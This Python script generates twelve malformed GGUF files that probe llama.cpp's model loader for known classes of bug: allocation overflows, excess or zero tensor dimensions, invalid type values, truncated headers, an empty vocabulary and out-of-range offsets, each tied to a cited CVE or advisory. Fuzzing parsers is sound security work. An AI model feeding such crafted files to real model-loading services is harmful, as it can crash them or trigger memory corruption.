#!/usr/bin/env python3
"""
Pattern-based GGUF fuzzing for llama.cpp b8149 (latest stable).

Generates crafted GGUF files targeting known vulnerability root causes:
  1. Integer overflow in allocation sizes (n_kv, n_tensors, string lengths)
  2. Signed/unsigned cast boundary values (INT32_MAX, UINT32_MAX)
  3. Zero/extreme dimension values in tensor descriptors
  4. Truncated files (missing data after valid header)
  5. Empty/huge vocab edge cases
  6. Large tensor offset causing OOB
  7. Invalid tensor type values
  8. Extremely large n_kv with small file (read past EOF)
"""
import struct
import os
import sys

GGUF_MAGIC = b"GGUF"
GGUF_VERSION = 3

GGUF_TYPE_UINT32 = 4
GGUF_TYPE_INT32 = 5
GGUF_TYPE_FLOAT32 = 6
GGUF_TYPE_STRING = 8
GGUF_TYPE_ARRAY = 9
GGUF_TYPE_UINT64 = 10

GGML_TYPE_F32 = 0
GGML_TYPE_F16 = 1
GGML_TYPE_Q4_0 = 2


def write_kv(f, key, vtype, value):
    kb = key.encode("utf-8")
    f.write(struct.pack("<Q", len(kb)))
    f.write(kb)
    f.write(struct.pack("<I", vtype))
    if vtype == GGUF_TYPE_UINT32:
        f.write(struct.pack("<I", value))
    elif vtype == GGUF_TYPE_STRING:
        vb = value.encode("utf-8")
        f.write(struct.pack("<Q", len(vb)))
        f.write(vb)
    elif vtype == GGUF_TYPE_INT32:
        f.write(struct.pack("<i", value))
    elif vtype == GGUF_TYPE_FLOAT32:
        f.write(struct.pack("<f", value))
    elif vtype == GGUF_TYPE_UINT64:
        f.write(struct.pack("<Q", value))
    elif vtype == GGUF_TYPE_ARRAY:
        elem_type, elems = value
        f.write(struct.pack("<I", elem_type))
        f.write(struct.pack("<Q", len(elems)))
        for v in elems:
            if elem_type == GGUF_TYPE_STRING:
                vb = v.encode("utf-8")
                f.write(struct.pack("<Q", len(vb)))
                f.write(vb)
            elif elem_type == GGUF_TYPE_FLOAT32:
                f.write(struct.pack("<f", v))
            elif elem_type == GGUF_TYPE_INT32:
                f.write(struct.pack("<i", v))
            elif elem_type == GGUF_TYPE_UINT32:
                f.write(struct.pack("<I", v))


def write_tensor_info(f, name, n_dims, dims, tensor_type, offset):
    nb = name.encode("utf-8")
    f.write(struct.pack("<Q", len(nb)))
    f.write(nb)
    f.write(struct.pack("<I", n_dims))
    for d in dims:
        f.write(struct.pack("<Q", d))
    f.write(struct.pack("<I", tensor_type))
    f.write(struct.pack("<Q", offset))


def base_metadata():
    return [
        ("general.architecture", GGUF_TYPE_STRING, "llama"),
        ("general.file_type", GGUF_TYPE_UINT32, 2),
        ("llama.context_length", GGUF_TYPE_UINT32, 512),
        ("llama.embedding_length", GGUF_TYPE_UINT32, 256),
        ("llama.block_count", GGUF_TYPE_UINT32, 1),
        ("llama.attention.head_count", GGUF_TYPE_UINT32, 4),
        ("llama.attention.head_count_kv", GGUF_TYPE_UINT32, 4),
        ("llama.feed_forward_length", GGUF_TYPE_UINT32, 256),
        ("llama.rope.freq_base", GGUF_TYPE_FLOAT32, 10000.0),
        ("llama.attention.layer_norm_rms_epsilon", GGUF_TYPE_FLOAT32, 1e-5),
        ("tokenizer.ggml.model", GGUF_TYPE_STRING, "gpt2"),
        ("tokenizer.ggml.tokens", GGUF_TYPE_ARRAY,
         (GGUF_TYPE_STRING, ["<unk>", "<s>", "</s>"])),
        ("tokenizer.ggml.scores", GGUF_TYPE_ARRAY,
         (GGUF_TYPE_FLOAT32, [0.0, 0.0, 0.0])),
        ("tokenizer.ggml.token_type", GGUF_TYPE_ARRAY,
         (GGUF_TYPE_INT32, [1, 2, 2])),
    ]


def write_gguf(path, metadata, tensor_count=0, tensors=None, raw_suffix=None):
    with open(path, "wb") as f:
        # GGUF v3 header: magic, version, n_tensors, n_kv
        f.write(GGUF_MAGIC)
        f.write(struct.pack("<I", GGUF_VERSION))
        f.write(struct.pack("<Q", tensor_count))    # n_tensors
        f.write(struct.pack("<Q", len(metadata)))    # n_kv
        for key, vtype, val in metadata:
            write_kv(f, key, vtype, val)
        if tensors:
            for t in tensors:
                write_tensor_info(f, *t)
        if raw_suffix:
            f.write(raw_suffix)


def write_raw_header(path, n_tensors, n_kv, extra_bytes=b""):
    """Write just a GGUF header with arbitrary n_tensors/n_kv counts."""
    with open(path, "wb") as f:
        # GGUF v3 header: magic, version, n_tensors, n_kv
        f.write(GGUF_MAGIC)
        f.write(struct.pack("<I", GGUF_VERSION))
        f.write(struct.pack("<Q", n_tensors))
        f.write(struct.pack("<Q", n_kv))
        f.write(extra_bytes)


def main():
    outdir = sys.argv[1] if len(sys.argv) > 1 else "poc"
    os.makedirs(outdir, exist_ok=True)

    # =========================================================================
    # Test 1: n_kv near overflow boundary
    # Pattern: CVE-2024-23605 (large n_kv → allocation overflow)
    # The old bug was fixed, but test if similar overflow exists in new gguf.cpp
    # =========================================================================
    print("Test 1: Large n_kv (0x7FFFFFFF) - allocation overflow probe")
    write_raw_header(
        os.path.join(outdir, "test01_large_nkv.gguf"),
        n_tensors=0, n_kv=0x7FFFFFFF
    )

    # =========================================================================
    # Test 2: n_tensors near overflow boundary
    # Pattern: CVE-2024-21836 (large n_tensors → heap overflow)
    # =========================================================================
    print("Test 2: Large n_tensors (0x7FFFFFFF) - allocation overflow probe")
    write_raw_header(
        os.path.join(outdir, "test02_large_ntensors.gguf"),
        n_tensors=0x7FFFFFFF, n_kv=0
    )

    # =========================================================================
    # Test 3: String key with length near INT32_MAX
    # Pattern: CVE-2024-23496 (large key length → heap overflow in gguf_fread_str)
    # We write a valid header but with a KV whose key length is huge
    # =========================================================================
    print("Test 3: KV key with length 0x80000000 (signed/unsigned boundary)")
    with open(os.path.join(outdir, "test03_huge_key_len.gguf"), "wb") as f:
        f.write(GGUF_MAGIC)
        f.write(struct.pack("<I", GGUF_VERSION))
        f.write(struct.pack("<Q", 0))   # n_tensors = 0
        f.write(struct.pack("<Q", 1))   # n_kv = 1
        # KV entry with huge key length
        f.write(struct.pack("<Q", 0x80000000))  # key length = 2GB
        # No actual key data follows (truncated)

    # =========================================================================
    # Test 4: Tensor with n_dims > GGML_MAX_DIMS (4)
    # Pattern: CVE-2024-21802 (n_dims out of bounds → heap overflow writing ne[j])
    # =========================================================================
    print("Test 4: Tensor with n_dims=8 (exceeds GGML_MAX_DIMS=4)")
    meta = base_metadata()
    write_gguf(
        os.path.join(outdir, "test04_excess_ndims.gguf"), meta,
        tensor_count=1,
        tensors=[("token_embd", 8, [1, 1, 1, 1, 1, 1, 1, 1], GGML_TYPE_F32, 0)]
    )

    # =========================================================================
    # Test 5: Tensor with n_dims=0
    # Edge case: zero dimensions may cause div-by-zero or empty allocation
    # =========================================================================
    print("Test 5: Tensor with n_dims=0 (zero dimensions)")
    meta = base_metadata()
    write_gguf(
        os.path.join(outdir, "test05_zero_ndims.gguf"), meta,
        tensor_count=1,
        tensors=[("token_embd", 0, [], GGML_TYPE_F32, 0)]
    )

    # =========================================================================
    # Test 6: Tensor with extremely large single dimension
    # Pattern: Integer overflow when computing tensor size (ne[0]*ne[1]*...)
    # =========================================================================
    print("Test 6: Tensor with dimension 0xFFFFFFFFFFFFFFFF (size overflow)")
    meta = base_metadata()
    write_gguf(
        os.path.join(outdir, "test06_huge_dim.gguf"), meta,
        tensor_count=1,
        tensors=[("token_embd", 2, [0xFFFFFFFFFFFFFFFF, 1], GGML_TYPE_F32, 0)]
    )

    # =========================================================================
    # Test 7: Tensor with invalid type value
    # Pattern: CVE-2024-42477 (invalid type → OOB in ggml_type_size lookup)
    # =========================================================================
    print("Test 7: Tensor with invalid type (0xFFFFFFFF)")
    meta = base_metadata()
    write_gguf(
        os.path.join(outdir, "test07_invalid_type.gguf"), meta,
        tensor_count=1,
        tensors=[("token_embd", 2, [4, 4], 0xFFFFFFFF, 0)]
    )

    # =========================================================================
    # Test 8: Truncated file (header says 10 KV pairs but file ends after 1)
    # Pattern: CVE-2024-41130 (truncated read → NULL pointer / uninitialized)
    # =========================================================================
    print("Test 8: Truncated file (n_kv=10 but only partial data)")
    meta = base_metadata()[:1]  # Only write 1 KV pair
    with open(os.path.join(outdir, "test08_truncated.gguf"), "wb") as f:
        f.write(GGUF_MAGIC)
        f.write(struct.pack("<I", GGUF_VERSION))
        f.write(struct.pack("<Q", 0))   # n_tensors = 0
        f.write(struct.pack("<Q", 10))  # n_kv = 10 (claim 10, only write 1)
        for key, vtype, val in meta:
            write_kv(f, key, vtype, val)
        # File ends here - truncated (no more KV pairs, no tensor info)

    # =========================================================================
    # Test 9: Vocab with 0 tokens but references to special token IDs
    # Pattern: GHSA-g4cc (vocab_size < hardcoded special_bos_id → OOB read)
    # =========================================================================
    print("Test 9: Vocab with 0 tokens (special token ID OOB)")
    meta = [
        ("general.architecture", GGUF_TYPE_STRING, "llama"),
        ("general.file_type", GGUF_TYPE_UINT32, 2),
        ("llama.context_length", GGUF_TYPE_UINT32, 512),
        ("llama.embedding_length", GGUF_TYPE_UINT32, 256),
        ("llama.block_count", GGUF_TYPE_UINT32, 1),
        ("llama.attention.head_count", GGUF_TYPE_UINT32, 4),
        ("llama.attention.head_count_kv", GGUF_TYPE_UINT32, 4),
        ("llama.feed_forward_length", GGUF_TYPE_UINT32, 256),
        ("llama.rope.freq_base", GGUF_TYPE_FLOAT32, 10000.0),
        ("llama.attention.layer_norm_rms_epsilon", GGUF_TYPE_FLOAT32, 1e-5),
        ("tokenizer.ggml.model", GGUF_TYPE_STRING, "gpt2"),
        ("tokenizer.ggml.tokens", GGUF_TYPE_ARRAY, (GGUF_TYPE_STRING, [])),
        ("tokenizer.ggml.scores", GGUF_TYPE_ARRAY, (GGUF_TYPE_FLOAT32, [])),
        ("tokenizer.ggml.token_type", GGUF_TYPE_ARRAY, (GGUF_TYPE_INT32, [])),
    ]
    write_gguf(os.path.join(outdir, "test09_empty_vocab.gguf"), meta)

    # =========================================================================
    # Test 10: Two tensors whose padded sizes overflow uint64 (ctx->size)
    # Pattern: CVE-2025-53630 (ctx->size integer overflow)
    # =========================================================================
    print("Test 10: Two tensors with sizes that overflow ctx->size (uint64)")
    meta = base_metadata()
    write_gguf(
        os.path.join(outdir, "test10_size_overflow.gguf"), meta,
        tensor_count=2,
        tensors=[
            ("tensor_a", 2, [0x7FFFFFFFFFFFFFFF, 2], GGML_TYPE_F16, 0),
            ("tensor_b", 2, [0x7FFFFFFFFFFFFFFF, 2], GGML_TYPE_F16, 0),
        ]
    )

    # =========================================================================
    # Test 11: KV array with huge element count
    # Pattern: Array allocation overflow (count * elem_size wraps)
    # =========================================================================
    print("Test 11: KV array with 0xFFFFFFFF elements (array alloc overflow)")
    with open(os.path.join(outdir, "test11_huge_array.gguf"), "wb") as f:
        f.write(GGUF_MAGIC)
        f.write(struct.pack("<I", GGUF_VERSION))
        f.write(struct.pack("<Q", 0))  # n_tensors = 0
        f.write(struct.pack("<Q", 1))  # n_kv = 1
        # Write a KV with array type, huge count
        kb = b"test.array"
        f.write(struct.pack("<Q", len(kb)))
        f.write(kb)
        f.write(struct.pack("<I", GGUF_TYPE_ARRAY))
        f.write(struct.pack("<I", GGUF_TYPE_UINT32))  # element type
        f.write(struct.pack("<Q", 0xFFFFFFFFFFFFFFFF))  # count = max uint64
        # No actual array data

    # =========================================================================
    # Test 12: Tensor offset pointing way beyond file
    # Pattern: Offset causes read past EOF or into unmapped memory
    # =========================================================================
    print("Test 12: Tensor with offset 0xFFFFFFFFFFFFFF00 (OOB offset)")
    meta = base_metadata()
    write_gguf(
        os.path.join(outdir, "test12_huge_offset.gguf"), meta,
        tensor_count=1,
        tensors=[("token_embd", 2, [4, 4], GGML_TYPE_F32, 0xFFFFFFFFFFFFFF00)]
    )

    print(f"\nDone. Generated 12 test GGUF files in {outdir}/")


if __name__ == "__main__":
    main()
